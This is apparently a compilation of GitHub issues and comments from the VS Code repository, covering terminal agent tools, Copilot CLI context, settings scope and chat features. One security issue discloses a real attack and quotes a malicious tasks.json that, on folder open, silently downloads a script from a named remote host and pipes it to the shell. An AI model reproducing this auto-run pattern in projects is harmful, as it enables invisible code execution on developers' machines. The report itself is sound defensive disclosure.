I think we could also do something reasonable like include the last 5 lines after a 100ms delay of giving input. That should cover many of the interactive cases like this I think.

Sharing media from merged PR #309924 for verification:

https://github.com/user-attachments/assets/3ffac361-e4e6-49bf-9748-027d6d0caeeb

Source PR: https://github.com/microsoft/vscode/pull/309924

title: "Replying to:" is incorrect for npm ini
description: Testing #309095 It seemed to get stuck on "Description:" for inputs where it didn't need to change the defaults
comments: /duplicate #309608

title: Should the model be encouraged to use a small subagent for multi-stage inputs?
description: Testing #309095 It seems like this could be done in a small/fast subagent model rather than the main agent loop
comments: formerly, subagents did not have access to `send_to_terminal` or `get_terminal_output`. But we wanted to add those anyway.
The issue with this approach is the subagent does not have access to our input needed/command finished notifications. We'd need async subagents for this.
We can do this though, to reduce roundtrips https://github.com/microsoft/vscode/issues/309509

title: `npm init` waiting for input triggers backgroundNotifications steering message
description:
Testing #309095

It did the right thing anyway, but when I asked the model to run `npm init` with `"chat.tools.terminal.backgroundNotifications": true,`, I saw a steering message saying the command completed when it started asking for input.
comments: Oh, it went away quickly, but it was actually a "needs input" steering message. That seems fine/expected

title: Chat context compaction losing vital detail
description:
Type: Bug When context compaction runs in chat there is a lot of detail lost. In some cases ive started to save the chat text to a file so the chat can ref itself. If we have to manage this then we need a way to know when the tokens are up and context compaction is about to occur so we can decide how to manage the imminent context loss (save to a planned_todo file maybe). This is a hack obviously and a better solution would be not to lose any context in chat in the first place. I have tried to keep chats as small and concise as possible but when planning conceptually this hard to do. Can you bring back the tokens spinner (not sure if it was in vs 2026 or vs code but neither have it now) that way we have a chance to save some meaningful instructions before we lose context. title: Feature request: locale-aware loading for chatSkills contributions
description: Type: Feature Request ## Feature request I would like VS Code to support locale-aware loading of `chatSkills` contributions, so an extension can expose different skill files depending on the user's UI language. ### Problem `chatSkills` is currently a static manifest contribution. If an extension wants to provide user guidance for Copilot in both English and Chinese, it has to either: - ship one bilingual skill file, or - manually duplicate skill files and rely on naming/description matching. This is workable, but it is not ideal for maintainability or user experience. In my case, I have an extension that exposes MCP tools to Copilot, and I want to provide a skill that explains how to use those tools. I would prefer to load a Chinese skill for Chinese UI users and an English skill for English UI users automatically. ### Expected behavior It would be helpful if VS Code allowed one of the following: 1. Conditional `chatSkills` contributions based on locale or user language, or 2. A localization mechanism for skill selection similar to `package.nls.json`, or 3. Support for a locale-aware `path`/`description` resolution for `chatSkills`. ### Why this matters - It keeps skill content concise and language-specific. - It avoids mixing two languages in one skill file. - It improves discoverability for Copilot users in localized environments. - It makes extension packaging cleaner for multilingual extensions. ### Current workaround The current workaround is to keep one bilingual skill file or create multiple skills and duplicate the instructions. That is acceptable, but not ideal. ### Additional context The extension API already supports localized manifest strings via `package.nls.json`, and VS Code exposes the user language via `vscode.env.language`. A similar mechanism for `chatSkills` would make localized Copilot guidance much cleaner. Thanks for considering this. VS Code version: Code 1.115.0 (41dd792b5e652393e7787322889ed5fdc58bd75b, 2026-04-07T22:04:57Z) OS version: Windows_NT x64 10.0.26200 Modes:

title: Copilot CLI session log lists wrong github branch
description: Testing #309276 - open VS Code on the VS Code repo, main branch - open a new chat view switch to Copilot CLI - ask 'what is my current branch?' - it replies with 'hediet/b/equivalent-porpoise' Open the session log at `~/.copilot/session-state/58a7c668-fb50-4391-83bd-987f31af04ac/events.jsonl` You see it was written there.
comments:
@alexr00 Comes from here:
https://github.com/microsoft/vscode-pull-request-github/blob/57a1e42b3ce05174e703549c7e3265552f81cc6f/src/lm/pullRequestContextProvider.ts#L77
Well that's really strange. Were you ever on `hediet/b/equivalent-porpoise`?
I think this must be some invalid context getting injected automatically into the request and then CLI integration passing this onto the CLI.

@alexr00 `hediet/b/equivalent-porpoise` was the branch of a PR I reviewed on Friday
@DonJayamanne These attachments are not part of the chat customizations but from a ChatWorkspaceContextProvider, part of our chat extension story.https://github.com/microsoft/vscode/issues/271104

@aeschli @alexr00  I'm excluding the following context variables from CLI, as its invalid (it causes model for Copilot CLI to misbehave).

```
<attachment id="microsoft/vscode-jupyter">
Information about one of the current repositories. You can use this information when you need to calculate diffs or compare changes with the default branch:
Repository name: vscode-jupyter
Owner: microsoft
Current branch: main
Default branch: main
</attachment>
```

When using CLI, we create (depends on a few things) work trees, and when using worktrees, the branch names and the like are completely different from what was in context variable.
Also I'm not sure why we need to attach this, as CLI (Model) can get all of this information from the terminal
1. Incorrect information (hence I'm removing them)
2. Why can't the model get these from terminal tool instead of having to inject these

This is one of those cases where having a special id will help me figure out what context to keep vs remove.
I can see that there are 4 different such context variables sent in a CLI session.
I'm not sure whether they're valid or not. Either way they're all being excluded.
Lets sync on this offline and figure out a solution.
@alexr00 will ping you if required, currently I'm already working with Martin/Josh on a related task.

If I'm not mistaken @alexr00 added the context providers API so that extensions can add their knowledge to the chat context and enable certain flows. @alexr00 do you know who else is using it already?
I did add those context providers. I don't know why the context would only break for Copilot CLI though. As far as I know it's just GHPR.

title: Feature Request: Allow `task.allowAutomaticTasks` to be set at the workspace level
description:
<!-- ⚠️⚠️ Do Not Delete This! feature_request_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- Please search existing issues to avoid creating duplicates. -->

<!-- Describe the feature you'd like. -->

Currently, `task.allowAutomaticTasks` is restricted to User (global) settings. This creates an "all-or-nothing" dilemma that severely limits workflow flexibility for developers. I strongly propose allowing this setting to be configured or overridden at the Workspace level (in `.vscode/settings.json`).

1. **Workspace Trust $\neq$ Automatic Execution**
   Workspace Trust is a broad security boundary. Just because I trust a workspace (meaning I am okay with language servers running or manually executing scripts) does not mean I want background tasks—like local servers, watchers, or build scripts—to spin up automatically the moment I open the folder. Coupling these two concepts is counter-productive.
2. **Security and Global Risks**
   Automatic task execution is, by definition, automated arbitrary code execution. Having this as a global setting means that if turned on, *all* trusted workspaces instantly get permission to automatically run code upon opening. This violates the principle of least privilege. Scoping this to the workspace level isolates the risk and better protects the user.
3. **The Need for Fine-Grained Control**
   Different projects require completely different workflows. The previous mechanism (which allowed folder-level authorization for automatic tasks) was excellent because it provided fine-grained control. For certain high-frequency personal projects, automatic tasks are essential; for open-source repositories I only occasionally review, I want the workspace to remain completely static upon opening. The current global approach strips away this flexibility.
4. **Request for Design Rationale**
   I would appreciate it if the team could explain the design rationale behind restricting this to a global setting. The current implementation feels like a suboptimal compromise between security and convenience. Understanding the reasoning behind this architectural choice would be highly beneficial to the community. @meganrogge Can you explain it? I found you make the changes.

**Expected Behavior:**
`task.allowAutomaticTasks` should be valid as a `workspace` setting in `settings.json`, and it should take precedence over the global User setting.
comments:
<!-- 6d457af9-96bd-47a8-a0e8-ecf120dfffc1 -->

If it receives 20 upvotes we will move it to our backlog. If not, we will close it. To learn more about how we handle feature requests, please see our [documentation](https://aka.ms/vscode-issue-lifecycle).

4. Want to edit in a regular VS Code editor tab, not in Agent Customizations
5. Use the "Open Modal Editor in Main Window"
6. I expected just the instruction file I was editing to open in an editor tab. Instead, the whole Agent Customizations moved into an editor tab
comments:
https://github.com/user-attachments/assets/044a8bd3-e01f-4ac8-928e-561c59eba96c

You can do so by right-click -> Open.  Would it help if i rename the context menu name?
That seems fine from the list! But once you've already clicked on the list entry you can't get into a code editor tab.

I think a common patter will be:
- Oh, what does this one do?
- Click on it to view it.
- Ok, I need to make some changes.
- Want to open in code editor tab.

title: Agent was not able to remove old screenshots from Artifacts
description: Testing #309326 1. Have agent session. Have it take at least 2 screenshots 2. tell agent "Update the artifacts list. Remove the two screenshots, and take a new screenshot of https://code.visualstudio.com/" 3. Notice the agent calls the Artifacts tool, but the result in the artifacts view is that there are 3 artifacts, and not just 1 as I would expect 🐛 [Update_the_artifacts_list__Remove_the_two_screensh_logs.json](https://github.com/user-attachments/files/26671631/Update_the_artifacts_list__Remove_the_two_screensh_logs.json)
comments:
These artifacts come from the static rules, not because the AI set them. The artifact tool cannot remove artifacts that come from there, that is by design and would be difficult to fix.
I'm open to discuss the design though (in a different issue).

title: Security: .vscode/tasks.json with runOn: folderOpen enables silent arbitrary code execution from cloned repositories
description:
Does this issue occur when all extensions are disabled?: Yes

- VS Code Version: all versions supporting `runOn: folderOpen` in tasks.json
- OS Version: Linux / macOS / Windows (all targeted)

Steps to Reproduce:

1. Clone the repository `https://github.com/Brjanzake/Jackpot_1`
2. Open the cloned folder in VS Code

**What happens:** A shell task with `"runOn": "folderOpen"` executes immediately and silently. It downloads and pipes a remote script to the system shell (`wget | sh` on Linux, `curl | bash` on macOS, `curl | cmd` on Windows) from `https://vscode-ip-checking-nine.vercel.app/api/settings/{os}`. The task's `presentation` is configured to be completely invisible to the user (`reveal: silent`, `echo: false`, `focus: false`, `close: true`).

No extensions are involved — this uses only the built-in Tasks functionality.

**The malicious `.vscode/tasks.json`:**

```json
{
  "label": "env",
  "type": "shell",
  "linux": {
    "command": "wget -qO- 'https://vscode-ip-checking-nine.vercel.app/api/settings/linux' | sh"
  },
  "osx": {
    "command": "curl -L 'https://vscode-ip-checking-nine.vercel.app/api/settings/mac' | bash"
  },
  "windows": {
    "command": "curl --ssl-no-revoke -L https://vscode-ip-checking-nine.vercel.app/api/settings/windows | cmd"
  },
  "runOptions": {
    "runOn": "folderOpen"
  },
  "presentation": {
    "reveal": "silent",
    "echo": false,
    "focus": false,
    "close": true,
    "panel": "new",
    "showReuseMessage": false,
    "clear": true
  }
}

Context: This is an active attack in the wild. I was targeted through a social engineering campaign (LinkedIn contact → scheduled video call → asked to clone and open this project). The .env file contains a base64-obfuscated C2 URL.

The core issue: runOn: folderOpen combined with presentation: silent allows zero-click, invisible arbitrary code execution from any cloned repository. Workspace Trust does exist but does not specifically warn about auto-executing tasks or display what commands will run.

Suggested mitigations:

Require explicit user consent before executing any runOn: folderOpen task, showing the exact command
Disallow reveal: silent for auto-run tasks
Consider blocking shell pipe patterns (| sh, | bash, | cmd) in auto-run tasks
comments:
Thank you for your report. The team’s attempts to repro required the user to confirm in the  Workspace Trust dialog (https://code.visualstudio.com/docs/editing/workspaces/workspace-trust). After that point, it’s *By Design* that opening a directory can trigger automatic scripts.

If you’ve found a way get execution without clicking the Workspace Trust dialog on the directory (or parent directory), please report it via our official security reporting mechanisms: https://github.com/microsoft/vscode-copilot-evaluation/blob/main/SECURITY.md#reporting-security-issues

We appreciate your suggestions for additional mitigations and will discuss them with the team. Thank you!

title: Test: HTTP 413 errors when using images in chat
description:
Refs https://github.com/microsoft/vscode/pull/308901 (see list of bugs linked from there)

- [x] anyOS @alexr00 (Anthropic)
- [x] anyOS @connor4312 (OpenAI)
- [x] anyOS @bhavyaus (Google)

Complexity: 3

Authors: @dmitrivMS 

[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+HTTP+413&assignees=dmitrivMS)

---

**Setup**
Create a folder with 10 or more images (PNG, but other formats work as well) of 2MB+ in size each.
Pick a web site from which you can take multiple screenshots.

Pick a model provider (one per person):
- Anthropic (Sonnet, Opus)
- OpenAI (GPT)
- Google (Gemimi)

You will be testing with models from this provider.

**Scenario**
Use AI (from chat, using the models assigned, one at a time, using latest versions) to run prompts that make chat load ALL the images (using View Image tool - make sure you see that in the chat). Ideally you want it to load multiple images in a single turn - as much as it can handle.

Your goal is to hit this error in chat:
```
Reason: Request Failed: 413 {"error":{"message":"failed to parse request","code":""}}
```

If you cannot, I succeeded.

**Ideas for Prompts**
- Ask chat to analyze all images in the folder and determine style/similarities/color contrast etc.
- Ask chat to navigate to a web site and take 10 screenshots of main pages (using Playwright) and then analyze all the screenshots for consistency/style/color contrast/etc.
- Load 10 random images from the internet into a folder, then analyze all images at once.
comments: Hi @dmitrivMS. As a member of the team, you can help us triage this issue by referring to https://github.com/microsoft/vscode-copilot/wiki/Copilot-Inbox-Tracker and assigning an owner directly.

> Ask chat to navigate to a web site and take 10 screenshots of main pages (using Playwright) and then analyze all the screenshots for consistency/style/color contrast/etc.

Should this be with the integrated browser? It's not able to load any external sites for me.
I now see the below errors for gemini models
Per discussion, Gemini issue is pre-existing, so not related to this change.

title: [Bug] All built-in extensions fail to load after update (post-April 8)
description:
Type: Bug 🐛 Bug Description For some unknown reason, all built-in extensions fail to load in my VS Code installation. The editor starts, but functionality dependent on built-in extensions (like TypeScript, Markdown, etc.) is broken. 🗓️ Timeline Everything was working perfectly fine before April 8th. The issue appeared after this date. 🔧 Troubleshooting Steps Taken I have already performed a thorough cleanup and reinstallation, but the issue persists. Here is what I have tried: Multiple Reinstallations: Uninstalled and reinstalled VS Code multiple times. Cleaned Directories: Manually deleted all Code and Microsoft VS Code related folders from the system. Registry Cleanup: Cleaned the Windows Registry to remove any lingering settings. Cleared User Extensions: Removed all installed user plugins/extensions. Fresh Install: Downloaded and installed the latest 0.115.0 User Installer version. Despite these steps, the built-in extensions still do not load. ℹ️ System Info VS Code Version: 0.115.0 (User Setup) OS: Windows Last working version: Pre-April 8, 2026 📝 Additional Context Since I have wiped all user settings and extensions, this seems to be an issue with the core application or the update mechanism itself. cc @deepak1556

The core symptom is that VS Code fails to load any built-in extensions (e.g., Git, Markdown preview, TypeScript, etc., are all non-functional).
While I do see some error messages regarding the MCP Registry in the Console, I suspect this might be a side effect of the Extension Host failing to initialize properly, or perhaps a blocking factor.

Version Rollback: Reverting to the stable version 1.109.5.
Version Update: Installing the latest Insiders build 1.116.0.
Clean Profile: Creating a new Windows user profile and launching VS Code there.
Current Status:
The problem persists across all attempts. Since the issue occurs even in a fresh Windows user profile and manifests as a total failure to load built-in extensions, it strongly suggests that the Extension Host process is crashing or being blocked during the early startup phase.
Request:
Is there a way to enable more verbose logging for the Extension Host startup? I would like to identify exactly what is causing the built-in extensions to be skipped or fail to load.

title: `remote.extensionKind` ignored from workspace/.vscode/settings.json and devcontainer Machine settings (only works from user settings)
description:
<!-- ⚠️⚠️ Do Not Delete This! bug_report_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- 🕮 Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->
<!-- 🔎 Search existing issues to avoid creating duplicates. -->
<!-- 🧪 Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->
<!-- 💡 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->
<!-- 🔧 Launch with `code --disable-extensions` to check. -->
Does this issue occur when all extensions are disabled?: N/A (this is about extension placement, not a specific extension)

- VS Code Version: 1.115.0 (41dd792b5e652393e7787322889ed5fdc58bd75b)
- OS Version: macOS 15.6 (arm64)
- Dev Containers Extension Version: 0.447.0

## Bug Summary

`remote.extensionKind` is registered with **no explicit `scope`** (defaults to `ConfigurationScope.WINDOW`), and the [documentation for `WINDOW` scope](https://github.com/microsoft/vscode/blob/main/src/vs/platform/configuration/common/configurationRegistry.ts#L147) states:

> Window specific configuration, which can be configured in the **user or workspace settings**.

However, when using Dev Containers, `remote.extensionKind` **only takes effect from user settings**. Setting it in `.vscode/settings.json` (workspace settings) or via `customizations.vscode.settings` in `devcontainer.json` (which writes to the container's Machine settings at `/root/.vscode-server/data/Machine/settings.json`) has **no effect**.

## Steps to Reproduce

1. Create a project with a `.devcontainer/devcontainer.json`:
   ```jsonc
   {
     "image": "mcr.microsoft.com/devcontainers/typescript-node:18",
     "customizations": {
       "vscode": {
         "settings": {
           "remote.extensionKind": {
             "GitHub.copilot": ["ui"],
             "GitHub.copilot-chat": ["ui"]
           }
         }
       }
     }
   }
   ```

2. Also add the same setting in `.vscode/settings.json`:
   ```json
   {
     "remote.extensionKind": {
       "GitHub.copilot": ["ui"],
       "GitHub.copilot-chat": ["ui"]
     }
   }
   ```

3. Make sure **user settings** (`~/Library/Application Support/Code/User/settings.json` on macOS) does **NOT** contain `remote.extensionKind`.

4. Reopen the project in the Dev Container.

5. Run `Developer: Show Running Extensions` — observe that GitHub Copilot and GitHub Copilot Chat are running in the **Remote Extension Host** (workspace side), not the local UI side.

6. Now add the same `remote.extensionKind` to **user settings**, rebuild/reopen the container — the extensions correctly run on the **UI (local)** side.

## Expected Behavior

`remote.extensionKind` should be honored from all `ConfigurationScope.WINDOW`-eligible sources:
- User settings ✅ (works)
- Workspace `.vscode/settings.json` ❌ (ignored)
- Container Machine settings (via `customizations.vscode.settings`) ❌ (ignored)

## Actual Behavior

Only user settings are effective. Workspace settings and container Machine settings are ignored.

## Root Cause Analysis (from source code)

I traced through the source to understand why:

1. **Extension kind resolution timing** — In [`nativeExtensionService.ts` → `_doResolveExtensions()`](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/services/extensions/electron-browser/nativeExtensionService.ts), the flow is:
   - Connect to container → remote filesystem becomes available
   - `_remoteExtensionsScannerService.scanExtensions()` fetches remote extensions
   - `initializeRunningLocation()` is called, which calls `readExtensionKinds()` → [`extensionManifestPropertiesService.getExtensionKind()`](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/services/extensions/common/extensionManifestPropertiesService.ts#L142) → `configurationService.getValue('remote.extensionKind')`

2. **Race condition** — At the point `getValue('remote.extensionKind')` is called, the `ConfigurationService` has synchronously loaded user settings (from the local filesystem), but the **remote Machine settings** and **workspace settings** (read via remote FS provider) may not have been loaded yet. So `getValue()` returns only the user settings value.

3. **Evidence from Dev Container log** — The container log confirms the Machine settings file exists and contains the correct value:
   ```
   [3081 ms] Start: Run in container: cat /root/.vscode-server/data/Machine/settings.json
   → { "remote.extensionKind": { "GitHub.copilot": ["ui"], "GitHub.copilot-chat": ["ui"] } ... }
   ```
   But the extension kind decision has already been made by this point.

## Suggested Fix

A few possible approaches:

1. **Ensure remote configuration sources are loaded before `initializeRunningLocation()`** — Add an explicit `await` for configuration initialization from remote sources before calling `getValue('remote.extensionKind')`.

2. **Change `remote.extensionKind` scope to `APPLICATION`** — If it's intentionally only meant to work from user settings, update the scope to accurately reflect this (and update docs accordingly).

3. **Read `remote.extensionKind` with `inspect()` and explicitly merge** — Instead of relying on `getValue()` timing, use `configurationService.inspect('remote.extensionKind')` and explicitly read from workspace/machine settings files that have already been transferred to the local side during container setup.

## Why This Matters

Teams want a zero-config solution: commit `remote.extensionKind` in `.vscode/settings.json` so all team members automatically get the correct extension placement in Dev Containers. Currently, every developer must manually add this to their personal user settings, which is error-prone and undiscoverable.

---

### Log 2: GitHub Copilot Chat Extension Log (Remote Extension Host)

Shows the Copilot Chat extension running inside the container (Remote Extension Host), failing to fetch due to the container's proxy settings (`127.0.0.1:7890`). This is the **symptom** — if `remote.extensionKind` from workspace/Machine settings had been honored, these extensions would run on the local (UI) side and wouldn't hit the container's proxy at all.

It then repeatedly fails with `ECONNREFUSED 127.0.0.1:7890` because the container doesn't have the host's proxy running. If `remote.extensionKind` had been honored from Machine/workspace settings, the extension would run on the local UI side where Electron fetcher and the proxy are available.

Thank you for your feedback. The community might need that policy to change. Strongly intertwining two different services might be suboptimal.

At least you could move Copilot out of the extensions and place it somewhere else so users know that it is not an uninstallable extension.

Cheers!

title: `run_in_terminal` tool description advertises 60KB output truncation but the live code path truncates at 16KB
description:
The `run_in_terminal` tool description tells the model it gets up to 60KB of output, but the live output-retrieval path caps at 16KB.

Tool description strings at [runInTerminalTool.ts#L135](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L135) and [#L219](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L219) both say:

> Output is automatically truncated if longer than 60KB to prevent context overflow

There are two `MAX_OUTPUT_LENGTH` constants with different values:

- [`runInTerminalHelpers.ts#L51`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/runInTerminalHelpers.ts#L51) → `60000`, only used by [`sanitizeTerminalOutput`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/runInTerminalHelpers.ts#L67), which has no non-test callers.
- [`outputHelpers.ts#L10`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/outputHelpers.ts#L10) → `16000`, used by [`getOutput`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/outputHelpers.ts#L12), which is the only output path reached by `runInTerminalTool`, `getTerminalOutputTool`, and `taskHelpers`.

So every `run_in_terminal` invocation that produces more than ~16KB of output returns only the last 16KB, regardless of what the tool description claims.

### User-visible implications

`truncateOutputKeepingTail` keeps the tail, so the head is what gets dropped. That's where errors usually live for `npm install`, `pip install`, `cargo build`, `pytest -v`, `git log`, etc. The agent reads a truncated tail, confidently concludes "nothing actionable in the output", and the user has to re-run or scroll up to find the real failure.

The model also plans against the wrong budget: told 60KB, it doesn't paginate or filter commands that would exceed 16KB, so the problem compounds on anything verbose.

### Shape of the fix

1. Pick one number. Either bump `outputHelpers.ts` to 60000 (or make it a setting like `chat.tools.terminal.maxOutputBytes`), or change the description strings to 16KB. The description and the truncation limit must agree.
2. Delete `sanitizeTerminalOutput` — it's dead code, and having a second `MAX_OUTPUT_LENGTH` constant in the same module is how this drift happened.
comments:
Revised after re-reading the linked issues (previous version labelled a few "Strong" that are really same-symptom-family, not same mechanism):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #299486 | run_in_terminal timeout silently truncates output with no signal to agent | Closed | Same class of bug: tool returns partial output with no flag, agent can't tell. That one is about the explicit `timeout` param; this one is about the 60KB-vs-16KB mismatch on the normal (non-timeout) path |
| Strong | #296887 | Terminal tool returns partial output for commands >~11s on terminals without shell integration | Closed | Same class: silent truncation with no indication to the agent. `NoneExecuteStrategy`'s 10s `extendedTimeoutMs` returns early; this issue is about `getOutput` capping at 16KB |
| Medium | #297109 | run_in_terminal tool non-deterministically truncates command output | Closed | Different mechanism (render-race between command-end marker and renderer flush) but same user-visible result: agent gets less output than the user expects |
| Medium | #282904 | Copilot Chat / Agent misses terminal output (last lines) on Windows (Git Bash + WSL) | Closed | Different mechanism (tail-dropping on Windows) but again same class — if the 16KB cap also drops content from the tail in some cases, these compound |
| Weak | #299588 | Copilot Chat repeatedly fails to read terminal output, causing retries and excessive token usage | Closed | End-user symptom (model retries because output looks empty) — could be exacerbated by the 16KB cap in some large-output cases, but no direct evidence |
| Weak | #299205 | Blind to terminal output | Open | Vague "command has output but model says none" report. Possibly amplified by the 16KB cap but not specifically about it |

The specific 60KB-in-tool-description vs 16KB-in-`outputHelpers.ts` mismatch is not covered by any of these.

title: Consolidate terminal prompt-detection regexes — currently duplicated across `executeStrategy` and `outputMonitor`
description:
Prompt and "waiting for input" detection lives in two places with overlapping but inconsistent regex sets:

- [`detectsCommonPromptPattern` at executeStrategy.ts#L60](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/executeStrategy/executeStrategy.ts#L60), called from the idle loop at [#L131](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/executeStrategy/executeStrategy.ts#L131)
- [`detectsInputRequiredPattern` at outputMonitor.ts#L468](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L468), [`detectsNonInteractiveHelpPattern` #L495](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L495), [`detectsVSCodeTaskFinishMessage` #L536](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L536), [`detectsGenericPressAnyKeyPattern` #L546](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L546)

Execute strategies use the first function to decide whether a command is idle. `OutputMonitor` uses the second set at [outputMonitor.ts#L288](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L288) and [#L300](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L300) to decide whether to fire `onDidDetectInputNeeded`. Both are answering facets of the same question — "is this terminal sitting at a prompt, and is it waiting for something?" — against different regex tables. A pattern added to one is not picked up by the other.

### User-visible implications

Disagreement between the two tables produces two failure modes, both on the single most visible interaction in the tool:

1. **Silent hang with a confused agent.** `executeStrategy` declares idle but `detectsInputRequiredPattern` doesn't match the shell's prompt. The tool card completes, the agent moves on, and the terminal sits unanswered at `(y/N)` / `Password:` / `(Pdb)`. User finds it later by scrolling up.
2. **Spurious "terminal needs your input" interruptions.** The reverse: `detectsInputRequiredPattern` matches something `detectsCommonPromptPattern` didn't treat as a real prompt, so the agent stops and asks the user what to type into a terminal that was just printing output.

Both symptoms look like "the agent is wrong", not like a regex drift bug, so users can't self-diagnose.

### Shape of the consolidation

- New module `promptDetection.ts` under `browser/tools/`
- Single table of `{ id, regex, category: 'prompt' | 'inputRequired' | 'taskFinish' | 'pressAnyKey' }`
- Thin wrappers `detectsCommonPromptPattern`, `detectsInputRequiredPattern`, etc. filter by category
- `promptDetection.test.ts` covering bash/zsh/fish/pwsh/cmd, `(Pdb)`, `ipdb>`, `[y/N]`, password prompts, `Press any key`
- Existing call sites re-export from the new module
comments:
Revised after re-reading the linked issues (previous version linked a couple that only matched on title):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #296886 | Terminal tool: "The terminal is awaiting input." fires false-positive after command completes at bash prompt | Closed | Reporter explicitly calls out that `executeStrategy.ts` has `detectsCommonPromptPattern` which correctly identifies `$` as completion, but `OutputMonitor` never consults it — the fix they propose (`import { detectsCommonPromptPattern } from '../../executeStrategy/executeStrategy.js'` and guard before the LLM call) is exactly this consolidation |
| Medium | #282933 | Agent confused by SSH key login prompt on command line | Open | SSH passphrase prompt is the canonical "terminal waiting for input that no current regex matches" case. Consolidated table would be the natural place to add it once, instead of having to add it twice and risk drift |

Dropped from the previous table:

- **#283507** — the title mentions RPS1 but the body is entirely about the assistant not waiting for `run_in_terminal` to return. Model-behavior issue, not prompt-detection regexes.
- **#288567** — about tweaks to the `isBackground` description string in the tool prompt. Unrelated to regex consolidation.

Still nothing captures the specific duplication between `executeStrategy.ts` and `outputMonitor.ts`. #296886 is the one that most directly argues for this issue's fix.

title: `TerminalSandboxService.checkForSandboxingPrereqs` re-runs on every command rewrite
description:
[`CommandLineSandboxRewriter.rewrite`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/commandLineRewriter/commandLineSandboxRewriter.ts#L17) awaits `this._sandboxService.checkForSandboxingPrereqs()` on every invocation. The implementation in [`terminalSandboxService.ts#L265`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/common/terminalSandboxService.ts#L265) does binary probing (`bwrap`, `socat`), sandbox config file reads, and JSON parsing of those files.

The prereq result is a function of installed OS binaries and sandbox settings. Neither changes between two back-to-back `run_in_terminal` invocations in the same session, so every call to `rewrite` pays for a recheck that's guaranteed to return the same answer.

Every foreground `run_in_terminal` goes through this path during `prepareToolInvocation`, before the confirmation UI renders. The cost is paid synchronously on the hot path between "user sends message" and "tool card appears".

Invalidation is bounded — a cached result is only stale if one of:

- `IConfigurationService.onDidChangeConfiguration` fires for any of the sandbox or agent network domain settings (the same list `ChatAgentToolsContribution` already listens for to re-register `runInTerminalTool`)
- `IWorkspaceContextService.onDidChangeWorkspaceFolders` fires and would change the resolved sandbox config location

Neither requires per-command evaluation.
comments:
Revised after re-reading: I don't think there is a genuinely related existing issue for this one.

Previous version linked **#298729** (sandbox command-quoting escape) on a "same subsystem, cache invalidation would be needed" argument — that's speculative and isn't what this issue is about. Dropping it.

This is a standalone performance/debt item: `checkForSandboxingPrereqs` does binary probes + config reads on every `run_in_terminal` rewrite, and the result is a function of state that only changes on `onDidChangeConfiguration` (sandbox settings) or `onDidChangeWorkspaceFolders`. No existing issue captures that.

title: OutputMonitor.continueMonitoringAsync does not cancel the previous monitoring run before starting a new one
comments:
Revised after re-reading the linked issues (previous version overreached on a few):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #299514 | Awaiting terminal input doesnt go away | Open | Sticky "awaiting input" that persists after input was already provided, with a subagent still running — consistent with a stale monitoring run re-firing `_onDidDetectInputNeeded` against the new run's state |
| Medium | #304530 | When the agent uses the read task tool, things get stuck on "Terminal is awaiting input" | Open | Symptom (stuck on "awaiting input" after task tool) is consistent with the stale-run `finally` overwriting `_pollingResult` / firing `_onDidDetectInputNeeded` on the new run, but no direct evidence it is this race |
| Weak | #307173 | We should not be invoking the LLM in output monitor | Open | Same `OutputMonitor` class. Orthogonal mechanism, but if a stale run reaches the LLM invocation branch before unwinding, the two problems compound |
